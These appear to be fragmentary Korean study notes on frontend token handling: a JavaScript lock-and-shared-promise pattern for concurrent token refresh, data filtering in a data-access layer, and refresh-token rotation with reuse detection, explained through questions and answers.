        3개의 요청이 동시에 실패했을 때 차례를 기다리는 코드이다. 이는 Promise 공유와 Lock 패턴을 사용한다.
        
        **🔷 패턴이 필요한 이유**
        
        1. **중복 요청 방지:** `isRefreshing`이라는 깃발을 세워, 이미 한 요청이 갱신 업무를 수행 중이라면 다른 요청들은 중복해서 서버에 요청을 보내지 않도록 막아준다.
        2. **갱신 완료 대기:** 먼저 보낸 갱신 요청의 결과값인 `refreshPromise`를 공유함으로써, 뒤따라오는 요청들이 각자 갱신을 시도하는 대신 새 토큰을 가져올 때까지 기다리게 만든다.
        3. **효율적인 재시도:** 갱신이 완료(`await refreshPromise`)되면, 기다리던 모든 요청이 최신화된 토큰을 사용하여 실패했던 API를 다시 호출(retry)하게 된다.
        
        ```jsx
        let isRefreshing = false;       // 현재 토큰을 새로 고치는 중인지 표시
        let refreshPromise = null;      // 진행 중인 갱신 작업(Promise)을 담아두는 곳
        
        async function handleUnauthorized(failedRequest) {
          // 만약 이미 누군가가 토큰을 갱신하고 있다면?
          if (isRefreshing) {
            // 작업이 끝날 때까지 여기서 기다림
            await refreshPromise;       
            // 갱신이 끝났으니, 방금 실패했던 요청을 새 토큰으로 다시 시도
            return retry(failedRequest); 
          }
        
          // (위의 if문을 통과했다면) 첫 번째로 도착한 요청 -> isRefreshing을 true로 하여 표시함
          isRefreshing = true;
          
          // 갱신 작업을 시작하고 Promise을 담아 모두 볼 수 있게함
          refreshPromise = refreshTokens(); 
        
          // 서버에서 새 토큰을 가져올 때까지 기다림
          await refreshPromise;
          
          // 토큰 갱신이 다 끝났으니 isRefreshing 값을 false로 표시함
          isRefreshing = false;
          
          // 새 토큰이 생겼으니 실패했던 원래 요청을 다시 시도
          return retry(failedRequest);
        }
        ```

        3. **데이터 정제 및 보안 필터링**
            
            서버에서 온 원본 데이터(Raw Data)에는 민감한 정보(예: 비밀번호, 주민번호)가 섞여 있을 수 있다. DAL에서 이를 가공하여 ****필요한 안전한 정보만 골라 전달하는 필터 역할을 수행한다.

    아이두 서버는 토큰 갱신 시 **Token Rotation**을 사용합니다:

    ```
            → 새 Token B 발급, A는 폐기됨
    
    시간 1: 해커가 탈취한 Token A로 갱신 시도
            → 서버: "이미 사용된 토큰이다!" → ???
    ```

    **Q3.** 프론트엔드에서는 Token Rotation 때문에 주의해야 할 점이 있나요? (힌트: 생각해보기 6의 Race Condition)

        **Q1 답변. 서버는 해당 사용자의 모든 세션을 만료 시키고 강제 로그아웃 처리해야 한다.**
        
        왜냐하면 이미 사용된 Refresh Token으로 다시 갱신 요청이 들어온다는 것은 누군가가 토큰을 탈취하여 재사용하려고 한다는 증거이기 때문이다. 서버는 누구 해커이고 누가 사용자인지 확신 할 수 없기에 모든 토큰을 무효화하여 계정을 보호해야 한다.

        **Q2 답변. Refresh Token A의 유효 기간이 끝날 때까지 사용할 수 있다.**

        ```mermaid
            Backend-->>App: 자체 Access Token & Refresh Token 응답
            App->>App: 토큰을 SecureStore에 안전하게 저장
        ```
